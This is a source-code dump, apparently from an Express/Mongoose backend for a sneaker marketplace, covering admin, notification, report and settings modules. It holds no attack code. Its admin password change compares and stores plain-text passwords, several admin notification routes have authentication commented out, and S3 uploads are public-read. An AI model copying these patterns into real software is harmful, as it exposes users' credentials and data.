        config.jwt.expires_in as SignOptions["expiresIn"]
    );

    // const refreshToken = createToken(
    //     jwtPayload,
    //     config.jwt_refresh_secret as string,
    //     config.jwt_refresh_expires_in as string
    // );

    return {user:{name:admin.name,email:admin.email,role:admin.role}, accessToken };
};

const editProfileService = async (userDetails: JwtPayload,file: Express.Multer.File | undefined, payload: Partial<IAdmin>) => {
    const {userId} = userDetails;

    if(!userId){
        throw new ApiError(400,"Admin id is required to edit admin profile");
    }

    const admin = await AdminModel.findById(userId);

    // Handle image update
    if (file) {
        if (admin.image) { deleteOldFile(admin.image as string); }

        admin.image = `uploads/admin-image/${file.filename}`;
    }

    if(payload.name) admin.name = payload.name;
    if(payload.contact) admin.contact = payload.contact;
    if(payload.address) admin.address = payload.address;

    await admin.save();
    
    return null;
    
}

const changeAdminPasswordService = async (userDetails: JwtPayload, payload: IChangePassword) => {
    // Service logic goes here
    const { userId } = userDetails;
    const { currentPassword, newPassword } = payload;

    const admin =  await AdminModel.findById(userId).select('+password');
    if(!admin){
        throw new ApiError(404,'Admin not found to change password');
    }

    // const isPasswordMatched = await user.isPasswordMatched(oldPassword);
    // if(!isPasswordMatched){
    //     throw new ApiError(400,'Old password is incorrect');
    // }

    if(admin.password !== currentPassword){
        throw new ApiError(400,'Old password is incorrect');
    }

    admin.password = newPassword;

    await admin.save();

    return null;
}

const deleteAdminService = async (userDetails: JwtPayload) => {
    const {userId} = userDetails;
    if(!userId){
        throw new ApiError(400,"User id is required to delete account");
    }

    const deletedAccount = await AdminModel.findByIdAndDelete(userId);

    if(!deletedAccount){
        throw new ApiError(500,"Failed to delete admin account.");
    }

    deleteOldFile(deletedAccount.image);

    return null;
}

const blockAdminService = async (userId: string) => {
    // const {userId} = query;
    
    if(!userId){
        throw new ApiError(400,"Admin id is required to block a admin");
    }

    const admin = await AdminModel.findById(userId);

    //block unblock admin
    admin.isBlockd = !admin.isBlockd;
    await admin.save();

    let msg;
    if(admin.isBlockd) msg = 'Admin is blocked successfully.';
    else msg = 'Admin is unblocked.';

    return {admin:{name: admin.name}, msg };
}

const dashboardStatService = async () => {

    // const [totalUsers,totalPosts,activePost] = await Promise.all([
    //     UserModel.countDocuments(),
    //     PostModel.countDocuments(),
    //     PostModel.countDocuments({status: { $ne: ENUM_POST_STATUS.DELIVERED}})
    // ]);

    // return {
    //     totalUsers,
    //     totalPosts,
    //     activePost
    // }
    
};


const DashboardService = {
    registerAdminService,
    loginAdminService,
    adminVerifyCode,
    adminSendVerifyCodeService,
    adminResetPasswordService,
    editProfileService,
    changeAdminPasswordService,
    deleteAdminService,
    blockAdminService,
    dashboardStatService,
    // salesActivityService
}

export default DashboardService;
```

## File: src/app/module/Dashboard/Dashboard.validation.ts
```typescript
import {z} from "zod";

export const createAdminvalidation = z.object({
  body: z.object({
    name: z.string().min(1, "Admin name is required"),
    email: z.string().email("Valid email required"),
    role: z.string().min(5, "Admin role is required"),
    password: z.string().min(5, "Password is required"),
  })
});

export const editProfilevalidation = z.object({
  body: z.object({
    name: z.string().min(1, "Profile id is required").optional(),
    address: z.string().min(1, "Address is required").optional(),
    phone: z.string().min(5, "Phone Number is required").optional(),
    contact: z.string().min(5, "Contact no. is required").optional(),
  })
});

export const adminLoginValidation = z.object({
  body: z.object({
    email: z.string().email().min(1, "Valid email required"),
    password: z.string().min(5, "password is required"),
  })
});

export const changeAdminPasswordValidation = z.object({
    body: z.object({
        oldPassword: z.string().min(4,'Old password must be at least 5 characters'),
        newPassword: z.string().min(4, 'New password must be at least 5 characters'),
        confirmPassword: z.string().min(4, 'Confirm password must be at least 5 characters'),
        
      })
      // validate that password === confirmPassword
      .refine(
        (data) => data.newPassword === data.confirmPassword,
        {
          message: "Password and confirm password must match",
          path: ["confirmPassword"],
        }
      ),
});
```

## File: src/app/module/Notification/Notification.controller.ts
```typescript
import { AuthRequest } from "../../../interface/authRequest";
import catchAsync from "../../../utilities/catchasync";
import sendResponse from "../../../utilities/sendResponse";
import NotificationServices from "./Notification.service";

const getAllNotification = catchAsync(async (req, res) => {
     const { user } = req as AuthRequest;

     const result = await NotificationServices.getAllNotificationService(user);
    
    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Retrieved all notification.",
        data: result,
    });
});

const deleteNotification = catchAsync(async (req, res) => {

     const result = await NotificationServices.deleteNotification(req.params.id);
    
    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Notification deleted.",
        data: result,
    });
});

const getAllAdminNotification = catchAsync(async (req, res) => {

     const result = await NotificationServices.getAllAdminNotificationService();
    
    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Retrieved all notification.",
        data: result,
    });
});

const deleteAdminNotification = catchAsync(async (req, res) => {

     const result = await NotificationServices.deleteAdminNotification(req.params.id);
    
    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Deleted notification.",
        data: result,
    });
});

const makeNotificationSeen = catchAsync(async (req, res) => {

     const result = await NotificationServices.makeNotificationSeen(req.params.id);
    
    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Notification marked as seen.",
        data: result,
    });
});
const makeAdminNotificationSeen = catchAsync(async (req, res) => {

     const result = await NotificationServices.makeAdminNotificationSeen(req.params.id);
    
    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Admin Notification marked as seen.",
        data: result,
    });
});

const NotificationController = { 
    getAllNotification,
    deleteNotification,
    getAllAdminNotification,
    deleteAdminNotification,
    makeNotificationSeen,
    makeAdminNotificationSeen
 };
export default NotificationController;
```

## File: src/app/module/Notification/Notification.routes.ts
```typescript
import express from "express";
import {auth, authorizeUser} from "../../middlewares/auth";
import validateRequest from "../../middlewares/validateRequest";
import NotificationValidations from "./Notification.validation";
import NotificationController from "./Notification.controller";


const notificationRouter = express.Router();


notificationRouter.get("/get-all-notification",
    authorizeUser,
    NotificationController.getAllNotification
);

notificationRouter.patch("/make-notification-seen/:id",
    // authorizeUser,
    NotificationController.makeNotificationSeen
);

notificationRouter.delete("/delete-notification/:id",

    NotificationController.deleteNotification
);

//dashboard

notificationRouter.get("/get-admin-notification",
    // authorizeUser,
    NotificationController.getAllAdminNotification
);

notificationRouter.delete("/delete-admin-notification/:id",
    // authorizeUser,
    NotificationController.deleteAdminNotification
);

notificationRouter.patch("/make-admin-notification-seen/:id",
    // authorizeUser,
    NotificationController.makeAdminNotificationSeen
);


export default notificationRouter;
```

## File: src/app/module/Notification/Notification.service.ts
```typescript
import { JwtPayload } from "jsonwebtoken";
import ApiError from "../../../error/ApiError";
import { INotification } from "./Notification.interface";
import {AdminNotificationModel, NotificationModel} from "./Notification.model";

const getAllNotificationService = async (userDetails: JwtPayload) => {

    const {profileId} = userDetails;

    const allNotification = await NotificationModel.find({toId: profileId}).sort({createdAt: -1}).lean();

    return allNotification;
    
};


const deleteNotification = async (id: string) => {
    
    const deletedNotification = await NotificationModel.findByIdAndDelete(id);

    if(!deletedNotification){
        throw new ApiError(500,"Failed to delete notification");
    }
    return deletedNotification;
    
};

//dashboard

const deleteAdminNotification = async (id: string) => {
    
    const deletedNotification = await AdminNotificationModel.findByIdAndDelete(id);

    if(!deletedNotification){
        throw new ApiError(500,"Failed to delete notification");
    }
    return deletedNotification;
    
};

const getAllAdminNotificationService = async () => {

    const allNotification = await AdminNotificationModel.find({}).sort({createdAt: -1}).lean();

    return allNotification;
    
};

const makeNotificationSeen = async (id: string) => {

    const updatedNotification = await NotificationModel.findByIdAndUpdate(id,{isSeen: true},{new:true});

    if(!updatedNotification){
        throw new ApiError(500,"Failed to update notification status.");
    }
    
    return updatedNotification;
    
}

const makeAdminNotificationSeen = async (id: string) => {

    const updatedNotification = await AdminNotificationModel.findByIdAndUpdate(id,{isSeen: true},{new:true});

    if(!updatedNotification){
        throw new ApiError(500,"Failed to update notification status");
    }
    return updatedNotification;
    
}


const NotificationServices = { 
    getAllNotificationService, 
    getAllAdminNotificationService ,
    deleteAdminNotification,
    deleteNotification,
    makeNotificationSeen,
    makeAdminNotificationSeen
};
export default NotificationServices;
```

## File: src/app/module/Notification/Notification.validation.ts
```typescript
import { z } from "zod";

export const updateNotificationData = z.object({
    body: z.object({
        name: z.string().optional(),
        phone: z.string().optional(),
        address: z.string().optional(),
    }),
});

const NotificationValidations = { updateNotificationData };

export default NotificationValidations;
```

## File: src/app/module/OldPair/OldPair.controller.ts
```typescript
import catchAsync from "../../../utilities/catchasync";
import sendResponse from "../../../utilities/sendResponse";
import OldPairServices from "./OldPair.service";

const u = catchAsync(async (req, res) => {

    // const result = await OldPairServices.u();

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "P",
        data: null,
    });
});

const OldPairController = { 

 };

export default OldPairController;
```

## File: src/app/module/Payment/Payment.controller.ts
```typescript
import catchAsync from "../../../utilities/catchasync";
import sendResponse from "../../../utilities/sendResponse";
import PaymentServices from "./Payment.service";

const u = catchAsync(async (req, res) => {

    // const result = await PaymentServices.u();

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "P",
        data: null,
    });
});

const PaymentController = { 

 };

export default PaymentController;
```

## File: src/app/module/Payment/Payment.service.ts
```typescript
import ApiError from "../../../error/ApiError";
import { IPayment } from "./Payment.interface";
import {PaymentModel} from "./Payment.model";

const stripePaymentService = async () => {

    //check which plan

    //if individual plan
        //only this user's subscription will be updated.

    //if Couple plan
        //both user's subscription will be updated

};

const PaymentServices = { 
    stripePaymentService
 };

export default PaymentServices;
```

## File: src/app/module/Report/Report.controller.ts
```typescript
import { AuthRequest } from "../../../interface/authRequest";
import catchAsync from "../../../utilities/catchasync";
import sendResponse from "../../../utilities/sendResponse";
import ReportServices from "./Report.service";

const addnewReport = catchAsync(async (req, res) => {

    const {user} = req as AuthRequest;

    const files = req.files as Express.Multer.File[];

    const result = await ReportServices.createNewReport(user,files,req.body);

    sendResponse(res, {
        statusCode: 201,
        success: true,
        message: "Report submitted.",
        data: result,
    });
});

const ReportController = { 
    addnewReport
 };

export default ReportController;
```

## File: src/app/module/Report/Report.routes.ts
```typescript
import express from "express";
import {auth, authorizeUser} from "../../middlewares/auth";
import validateRequest from "../../middlewares/validateRequest";
import ReportValidations from "./Report.validation";
import ReportController from "./Report.controller";
import { uploadProfile } from "../../middlewares/multerMiddleware";


const ReportRouter = express.Router();


ReportRouter.post("/add-new-report",
    authorizeUser,
    uploadProfile.array("report-image",4),
    validateRequest(ReportValidations.addReportValidationSchema),
    ReportController.addnewReport
);


export default ReportRouter;
```

## File: src/app/module/Report/Report.service.ts
```typescript
import ApiError from "../../../error/ApiError";
import { IJwtPayload } from "../../../interface/jwt.interface";
import { IReport } from "./Report.interface";
import ReportModel from "./Report.model";



const createNewReport = async (
    userDetails: IJwtPayload, 
    files: Express.Multer.File[],
    payload: Partial<IReport>
) => {

    const {profileId} = userDetails;

    let imageUrls;

    if(files.length > 0){

        imageUrls = files.map(file => {
            // Assuming you have a function to upload the file and get its URL
            return `uploads/report-image/${file.filename}`; // Replace with actual URL generation logic
        });
    }


    console.log("product images:",imageUrls);


    const report = await ReportModel.create({
        buyerId:profileId,
        images: imageUrls,
        ...payload
    });

    if(!report){
        throw new ApiError(500,"Failed to add new report.");
    }

    //send notification /email

    return report;
};

const getAllReport = async () => {

    
};


const ReportServices = { 
    createNewReport,
 };

export default ReportServices;
```

## File: src/app/module/Report/Report.validation.ts
```typescript
import { z } from "zod";

   

const addReportValidationSchema = z.object({
    body: z.object({
        retailerId: z.string().min(24,"Buyer id is required."),
        orderId: z.string().min(24,"Buyer id is required.").optional(),
        title: z.string().min(1,"Report title is required."),
        content: z.string().min(1,"Report content is required."),
        resolution: z.string().min(1,"Report content is required.").optional(),
        contactMethod: z.string().min(1,"Report contacr method is required.").optional(),
        isUrgent: z.boolean().optional(),
       
    }),
});

const ReportValidations = { 
    addReportValidationSchema
 };

export default ReportValidations;
```

## File: src/app/module/Reseller/Reseller.validation.ts
```typescript
import { z } from "zod";

        
const makeRequestForPairValidationSchema = z.object({
    body: z.object({
        pairId: z.string().min(24, "Pair ID is required"),
        quantity: z.number().min(1, "Quantity is required").optional(),
        variant: z.object({
            gender: z.string().min(1, "Gender is required"),
            size: z.number().min(0, "Size must be a positive number")
        }).optional(),
        askingPrice: z.number().min(1, "Asking price must be a positive number").optional(),
        offerPrice: z.number().min(1, "Offer price must be a positive number"),
        validityHours: z.number().min(1, "Validity hours is required"),
        note: z.string().optional(),
        dealCompletionType: z.enum(["Immediate", "Negotiable"]).optional(),
    }),
});

const ResellerValidations = { 
    makeRequestForPairValidationSchema
 };

export default ResellerValidations;
```

## File: src/app/module/Settings/Settings.model.ts
```typescript
import { model, models, Schema } from "mongoose";
import { IFaq, IHelpAndSupport, IReport, ISettings } from "./Settings.interface";

//help and support model
const HelpAndSupportSchema = new Schema<IHelpAndSupport>({
    buyerId: { type: Schema.Types.ObjectId, ref: "Buyer", required: true },
    orderId: { type: Schema.Types.ObjectId, ref: "Order", required: true },
    type: { type: String, required: true },
    images: { type: [String], default: [] },
    content: { type: String, required: true },
    status: { type: String, default: "open" },
    isUrgent: { type: Boolean, default: false },
}, { timestamps: true });

const ReportSchema = new Schema<IReport>({
    buyerId: { type: Schema.Types.ObjectId, ref: "Buyer", required: true },
    productId: { type: Schema.Types.ObjectId, ref: "Product", required: true },
    type: { type: String, required: true },
    images: { type: [String], default: [] },
    content: { type: String, required: true },
    contactMethod: { type: String, required: true },
    isUrgent: { type: Boolean, default: false },
}, { timestamps: true });

//! Privacy and policy
const privacySchema = new Schema<ISettings>(
  {
    description: {
      type: String,
      required: true,
    }
  },
  {
    timestamps: true,
  },
);

//! Privacy and policy
const faqSchema = new Schema<IFaq>(
  {
    question: {
      type: String,
      required: true,
    },
 
    answer: {
      type: String,
      required: true,
    }
  },{
    timestamps: true
  }
);


//! Terms Conditions
const termsAndConditionsSchema = new Schema<ISettings>(
  {
    description: {
      type: String,
      required: true,
    },
  },
  {
    timestamps: true,
  },
);

const HelpAndSupportModel = models.HelpAndSupport || model<IHelpAndSupport>("HelpAndSupport", HelpAndSupportSchema);

const ReportModel = models.Report || model<IReport>("Report", ReportSchema);

const PrivacyPolicyModel = models.PrivacyPolicy || model('PrivacyPolicy', privacySchema);

const TermsConditionsModel = models.TermsConditions || model(
  'TermsConditions',
  termsAndConditionsSchema
);

const FaqModel = models.Faq || model('Faq',faqSchema);

export {
     HelpAndSupportModel,
      ReportModel,
     PrivacyPolicyModel,
     TermsConditionsModel,
     FaqModel
};

// export default SettingsModel;
```

## File: src/app/module/Settings/Settings.service.ts
```typescript
import ApiError from "../../../error/ApiError";
import { IFaq, IHelpAndSupport, ISettings } from "./Settings.interface";
import { FaqModel, HelpAndSupportModel, PrivacyPolicyModel, TermsConditionsModel } from "./Settings.model";

//help and support service
const submitHelpAndSupportService = async (payload: IHelpAndSupport) => {

    const result = await HelpAndSupportModel.create({...payload});

    if (!result) {
        throw new ApiError(500, "Failed to submit help and support request");
    }

    return result;
};

const getHelpAndSupportService = async () => {

    const result = await HelpAndSupportModel.find({}).lean();

    return result;
};

const deleteHelpAndSupportService = async (id: string) => {

    const result = await HelpAndSupportModel.findByIdAndDelete(id);

    if (!result) {
        throw new ApiError(500, "Failed to delete this report.");
    }

    return result;
};


//! Privacy and policy

const getPrivacyPolicy = async () => {

  return await PrivacyPolicyModel.findOne({});

};

const editPrivacyPolicy = async (id: string, payload: ISettings) => {

  
  const result = await PrivacyPolicyModel.findByIdAndUpdate(id , {...payload}, {
    new: true,
    runValidators: true,
  });

  if(!result){
    throw new ApiError(500,"Failed to update privacy policy");
  }

  return result;
};

//terms and consitions

const getTermsConditions = async () => {

    return await TermsConditionsModel.findOne({});

};

const editTermsConditions = async (id: string,payload: ISettings) => {

    
    const result = await TermsConditionsModel.findByIdAndUpdate( id , payload, {
        new: true,
        runValidators: true,
    });

    if(!result){
        throw new ApiError(500,"failed to update Terms and conditions");
    }
    
    return result;
};

//faq service

const createFaqService = async (payload: IFaq) => {

    const result = await FaqModel.create(payload);

    if(!result){
        throw new ApiError(500,"Failed to create FAQ.");
    }

    return result;
}

const getFaqService = async () => {

    const allFaq = await FaqModel.find({}).lean();

    return allFaq;
}

const editFaqService = async (id: string, payload: Partial<IFaq>) => {

    const result = await FaqModel.findByIdAndUpdate(id, payload, {
        new: true,
        runValidators: true,
    });

    if(!result){
        throw new ApiError(500,"Failed to update FAQ.");
    }

    return result;
}

const deleteFaqService = async (id: string) => {

    const result = await FaqModel.findByIdAndDelete(id);

    if(!result){
        throw new ApiError(500,"Failed to delete FAQ.");
    }

    return result;
}

const SettingsServices = { 
    submitHelpAndSupportService,
    getHelpAndSupportService,
    deleteHelpAndSupportService,
    getPrivacyPolicy,
    editPrivacyPolicy,
    getTermsConditions,
    editTermsConditions,
    createFaqService,
    getFaqService,
    editFaqService,
    deleteFaqService
 };

export default SettingsServices;
```

## File: src/error/handleZodError.ts
```typescript
// import { ZodError, ZodIssue } from 'zod';
// import {
//   TErrorSources,
//   TGenericErrorResponse,
// } from '../interface/error.interface';

// const handleZodError = (err: ZodError): TGenericErrorResponse => {
//   const errorSources: TErrorSources = err.issues.map((issue: ZodIssue) => {
//     return {
//       path: issue.path[issue.path.length - 1],
//       message: issue.message,
//     };
//   });
//   const statusCode = 400;

//   return {
//     statusCode,
//     message: 'Zod Validation Error',
//     errorSources,
//   };
// };

// export default handleZodError;

import { ZodError } from 'zod';
import {
  TErrorSources,
  TGenericErrorResponse,
} from '../interface/error.interface';

const handleZodError = (err: ZodError): TGenericErrorResponse => {
  const errorSources: TErrorSources = err.issues.map(issue => ({
    path: issue.path.map(String).join('.') || 'root',
    message: issue.message,
  }));

  return {
    statusCode: 400,
    message: 'Zod Validation Error',
    errorSources,
  };
};

export default handleZodError;
```

## File: src/helper/datingSuggestions.ts
```typescript
// import { IDatingPayload } from "../app/module/Date/Date.interface";
// import openai from "../config/openAI";
// import ApiError from "../error/ApiError";

// export const generateDatingSuggestionFromAI = async (payload: IDatingPayload) => {

//     let parsedJsonResponse;

//     const prompt = `
// You are an expert dating assistant inside a modern couples app.

// Your task is to generate HIGH-QUALITY, REALISTIC, and CONTEXT-AWARE dating suggestions.

// ----------------------
// INPUT CONTEXT:
// ----------------------
// City: ${payload.city}
// Mood: ${payload.mood} (Options: Romantic, Adventurous, Cozy, Playful, Spontaneous)
// Vibe: ${payload.vibe} (Options: Foodie, Artsy, Outdoor, Cozy, Luxe, Hidden Gems)
// Time of Day: ${payload.timeOfDay} (Options: Morning, Afternoon, Evening, Night, Late Night)
// Start Time: ${payload.startTime}
// Budget: ${payload.budget} (Options: Budget Friendly, Moderate, Splurge)

// ----------------------
// INSTRUCTIONS:
// ----------------------

// 1. Generate EXACTLY 2 unique dating suggestions.

// 2. Each suggestion must:
// - Match the selected Mood and Vibe
// - Be appropriate for the Time of Day
// - Respect the Budget level
// - Be realistic for the given City (no fictional places)

// 3. Budget Rules:
// - Budget Friendly → low-cost/free activities (parks, street food, walking, free galleries)
// - Moderate → mid-range cafes, casual dining, small activities
// - Splurge → premium restaurants, luxury experiences, exclusive venues

// 4. Time Logic:
// - Morning → breakfast, cafes, outdoor walks
// - Afternoon → activities, exploring, light meals
// - Evening → dinner, sunset, romantic spots
// - Night → cozy dining, quiet places
// - Late Night → limited options (cafes, drives, desserts)

// 5. Mood Logic:
// - Romantic → intimate, emotional, cozy
// - Adventurous → exciting, active, exploring
// - Cozy → relaxed, comfortable, low-energy
// - Playful → fun, interactive, lighthearted
// - Spontaneous → unique, slightly unexpected ideas

// 6. Vibe Logic:
// - Foodie → prioritize food experiences
// - Artsy → galleries, creative spaces
// - Outdoor → parks, nature, open-air
// - Cozy → indoor, calm environments
// - Luxe → premium/luxury experiences
// - Hidden Gems → less crowded, unique places

// 7. Timeline Rules:
// - Must start exactly from the given Start Time
// - Must be sequential and realistic
// - Each step must include time (e.g., "10:00 AM - ...")
// - Keep steps short and clear (2–4 steps max)

// ----------------------
// OUTPUT FORMAT (STRICT JSON):
// ----------------------

// Return ONLY a valid JSON array:

// [
//   {
//     "city": "${payload.city}",
//     "title": "Short engaging title (max 20 words)",
//     "mood": "${payload.mood}",
//     "vibe": "${payload.vibe}",
//     "time": "${payload.timeOfDay}",
//     "budget": "${payload.budget}",
//     "venues": ["realistic place or type", "another place"],
//     "timeline": [
//       "${payload.startTime} - First activity",
//       "Next time - Next activity"
//     ]
//   }
// ]

// ----------------------
// STRICT RULES:
// ----------------------
// - Return ONLY JSON (no text, no explanation)
// - Do NOT include markdown
// - Do NOT include comments
// - Ensure valid parsable JSON
// - Avoid generic titles like "Nice Date"
// - Avoid repeating the same idea twice
// - Keep suggestions practical and culturally relevant to the city
// `;
    

//   const response = await openai.chat.completions.create({
//     model: "gpt-4.1-mini",
//     messages: [
//       { role: "user", content: prompt }
//     ],
//     temperature: 0.7
//   });

// //   const text:any = response.choices[0].message.content;

//   //parse response to json
//   try {

//     parsedJsonResponse = JSON.parse(response.choices[0].message.content || "[]");
//   } 
//   catch {
//     // throw new Error("Invalid AI response");
//     throw new ApiError(400,"Invalid AI response to parse json.");
//   }

//   return parsedJsonResponse;
// };



// /*
// const prompt = `
// you are an experienced travel guide in the ${payload.city} city.
// Generate 2 dating ideas in JSON format.

// Input:
// City: ${payload.city}
// Mood: ${payload.mood}
// Vibe: ${payload.vibe}
// Time of day: ${payload.timeOfDay}
// Start time: ${payload.startTime}

// Output format:
// [
//   {
//     "city": "string",
//     "title": "string",
//     "mood": "string",
//     "vibe": "string",
//     "time": "string",
//     "venues": ["string"],
//     "timeline": ["string"]
//   }
// ]

// Rules:
// - Return ONLY JSON
// - No explanation
// `;
// */

// /*
// const prompt = `
// You are an expert dating assistant for a couples app.

// Your job is to generate creative, realistic, and emotionally engaging dating ideas based on user preferences.

// INPUT:
// - City: ${payload.city}
// - Mood: ${payload.mood}
// - Vibe: ${payload.vibe}
// - Time of day: ${payload.timeOfDay}
// - Start time: ${payload.startTime}

// INSTRUCTIONS:
// - Generate EXACTLY 2 unique dating suggestions
// - Suggestions must feel natural and realistic for ${payload.city} city
// - Include a mix of indoor/outdoor activities when possible
// - Keep ideas practical (no fantasy or unrealistic places)
// - Timeline should be sequential and time-based
// - Keep each timeline step short and clear

// OUTPUT FORMAT (STRICT JSON ONLY):
// [
//   {
//     "city": "${payload.city}",
//     "title": "Short engaging title",
//     "mood": "${payload.mood}",
//     "vibe": "${payload.vibe}",
//     "time": "${payload.timeOfDay}",
//     "venues": ["realistic place 1", "realistic place 2"],
//     "timeline": [
//       "10:00 AM - ...",
//       "11:00 AM - ..."
//     ]
//   }
// ]

// RULES:
// - Return ONLY valid JSON
// - Do NOT include explanations
// - Do NOT include markdown
// - Do NOT include extra text
// - Ensure JSON is parsable
// `;
// */
```

## File: src/helper/multerS3.ts
```typescript
// middlewares/uploadToS3.ts
import multer from "multer";
import multerS3 from "multer-s3";
import path from "path";
import { s3 } from "../config/awsS3";
import config from "../config";

// router.post(
//   "/upload-multiple",
//   uploadToS3.array("files", 5),
//   createPost
// );

// router.post(
//   "/upload",
//   uploadToS3.single("file"),
//   createPost
// );

// const createPost = catchAsync(async (req, res) => {
//   const file = req.file as Express.MulterS3.File;

//   // S3 gives you a public URL
//   const fileUrl = file.location;

//   sendResponse(res, {
//     statusCode: 200,
//     success: true,
//     message: "File uploaded successfully",
//     data: {
//       url: fileUrl,
//       key: file.key,
//     },
//   });
// });



export const multerS3Storage = multerS3({
    s3,
    bucket: config.aws.bucket_name!,
    acl: "public-read", // or private
    contentType: multerS3.AUTO_CONTENT_TYPE,

    key: (req, file, cb) => {
      const ext = path.extname(file.originalname);
      const fileName = `uploads/${Date.now()}-${file.originalname}`;
      cb(null, fileName);
    },
  });
```

## File: src/helper/notification.ts
```typescript
import { NotificationModel } from "../app/module/Notification/Notification.model";
import { getIO } from "../socket/socket.connection";
import { ENUM_NOTIFICATION_TYPE } from "../utilities/enum";


//create new notification
class NotificationService {

    async createNotification(payload: {
        toId: string;
        toModel: string;
        title: string;
        description?: string;
        message?: string;
        type: string;
        referenceId?: string;
        referenceModel?: string;
        metadata?: any;
    }) {

        const notification = await NotificationModel.create(payload);

        // Emit real-time event
        const io = getIO();

        // 🔥 Emit to specific user room
        io.to(payload.toId).emit("new-notification", notification);


        return notification;
    }
}

export default new NotificationService();
```

## File: src/mailTemplate/verifyEmailTemp.ts
```typescript
import { TEmailTemplate } from "../interface/email.interface";

const verifyEmailTemp = (data: TEmailTemplate) => `
  <html>
    <head>
      <style>
        body {
          font-family: 'Verdana', 'Arial', sans-serif;        
          font-family: Arial, sans-serif;
          background-color: #f2f3f8;
          margin: 0;
          padding: 0;
        }
        .container {
          font-family: 'Verdana', 'Arial', sans-serif;        
          max-width: 600px;
          margin: 40px auto;
          background-color: #ffffff;
          padding: 40px;
          border-radius: 10px;
          box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
        }
        h1 {
          color: #022C22;
          font-size: 26px;
          margin-bottom: 20px;
          font-weight: bold;
          text-align: center;
        }
        p {
          color: #555555;
          line-height: 1.8;
          font-size: 16px;
          margin-bottom: 20px;
        }
        .logo {
          text-align: center;
        }
        .logo-img {
          max-width: 20%;

        }
        .code {
          text-align: center;
          background-color: #e8f0fe;
          padding: 14px 24px;
          font-size: 20px;
          font-weight: bold;
          color: #022C22;
          border-radius: 6px;
          letter-spacing: 2px;
          margin: 20px 0;
        }
        .footer {
          margin-top: 30px;
          font-size: 13px;
          color: #9e9e9e;
          text-align: center;
        }
        .footer p {
          margin: 5px 0;
        }
        a {
          color: #022C22;
          text-decoration: none;
        }
      </style>
    </head>
     
    <body>
      <div class="container">
        <h1>Welcome to Sneakershub!</h1>
        <p>Hello, ${data.name}</p>
        <p>Thank you for choosing tow factor authentication. To verify your recovery email and secure your account, please use the one-time password (OTP) below:</p>
        <h3>Your Otp: ${data.code}</h3>
        <p>This code will expire in 10 minutes. If you didnt request this, please ignore this email.</p>
        
        <p>Best Regards,<br>Team Sneakershub</p>
      </div>
      <div class="footer">
        <a href="https://profitablebusinessesforsale.com/"><img src="https://pbfsimage.s3.eu-north-1.amazonaws.com/Pbfs_logo.png" class="logo-img"/></a>
        
       <p> <a href="https://profitablebusinessesforsale.com/">ProfitableBusinessesForSale.com</a> | <a href="info@ProfitableBusinessesForSale.com">info@ProfitableBusinessesForSale.com</a>.</p>
        <p> Follow Us on 
          <a href="https://www.facebook.com/share/1J7PbBaf1G/?mibextid=wwXIfr">Facebook</a> |
          <a href="https://www.instagram.com/profitablebusinessesforsale?igsh=MTc5bTVrcWJoZHNtbQ%3D%3D&utm_source=…">Instagram</a>
        </p>
      </div>
    </body>
  </html>
`;

export default verifyEmailTemp;

// /<-- <a href="https://profitablebusinessesforsale.com/"><img src="uploads/logo/pbfs-logo.png" alt="PBFS" class="logo-img"/></a> -->
```

## File: src/utilities/sendImageToCloudinary.ts
```typescript
// import { UploadApiResponse, v2 as cloudinary } from 'cloudinary';
// import config from '../config';
// import multer from 'multer';
// import fs from 'fs';
// ////----------------
// cloudinary.config({
//   cloud_name: config.cloudinary_cloud_name,
//   api_key: config.cloudinary_api_key,
//   api_secret: config.cloudinary_api_secret,
// });

// export const sendImageToCloudinary = (
//   imageName: string,
//   path: string,
// ): Promise<Record<string, unknown>> => {
//   //--------------------------
//   return new Promise((resolve, reject) => {
//     cloudinary.uploader.upload(
//       path,
//       { public_id: imageName },
//       function (error, result) {
//         if (error) {
//           reject(error);
//         }
//         resolve(result as UploadApiResponse);
//         // delete a file asynchronously--------
//         fs.unlink(path, (err) => {
//           if (err) {
//             reject(err);
//           } else {
//             console.log('file is deleted successfully');
//           }
//         });
//       },
//     );
//   });
// };

// const storage = multer.diskStorage({
//   destination: function (req, file, cb) {
//     cb(null, process.cwd() + '/uploads');
//   },
//   filename: function (req, file, cb) {
//     const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
//     cb(null, file.fieldname + '-' + uniqueSuffix);
//   },
// });

// export const upload = multer({ storage: storage });
```

## File: src/app.ts
```typescript
import express, { Application } from 'express';
import cors from 'cors';
import cookieParser from 'cookie-parser';
import globalErrorHandler from './app/middlewares/globalErrorHandler';
import notFound from './app/middlewares/notFound';
import allRouter from './app/routes';
// import {webhookRouter} from './app/module/Payment/Payment.routes';



const app: Application = express();

//use webhook route before app.use(express.json())
// app.use("/paystack", webhookRouter);

app.use(express.json());
app.use(express.urlencoded({extended: true}));
app.use(cookieParser());
app.use(cors());

app.use('/uploads', express.static('uploads'));

// application routers ----------------
app.use('/', allRouter);


app.get('/', (req, res) => {
  res.send("Sneaker hub server is running ---- Welcome to Sneaker Hub API.");
});



// global error handler
app.use(globalErrorHandler);
// not found
app.use(notFound);

export default app;
```

## File: src/app/module/auth/auth.interface.ts
```typescript
import { Types } from "mongoose";

export interface IAuth {
    profile: Types.ObjectId;
    refModel: string;
    email: string;
    name?: string;
    phone?: string;
    password: string;
    authProviders: {
        provider: string,
        providerId: string
    }[];
    role: string
    verificationCode: string;
    isEmailVerified: boolean;
    isProfileCompleted: boolean;
    isBlocked: boolean;
}

export type TRegisterUser = {
    name : string;
    email: string;
    password: string;
    confirmPassword: string;
    userType: string;
    shoeSize?: {};
    latitude?: number;
    longitude?: number;
}

export interface TLoginUser {
    email: string;
    password: string;
}

export interface IResetPassword {
    email: string;
    newPassword: string;
    confirmPassword: string;
}
```

## File: src/app/module/Buyer/Buyer.interface.ts
```typescript
import { ObjectId, Types } from "mongoose";

// Buyer Interface
export interface IBuyer {
  auth: Types.ObjectId;
  name: string;
  email: string;
  image: string;
  phone: string;
  bio: string;
  membershipStatus: string;
  shoeSize: number;
  selectedShoeSize: {
    label: string;
    size: number;
  }[];
  brands: string[];
  location: {
    type: string;
    coordinates: number[];
  };
   address: string;
  notification: {
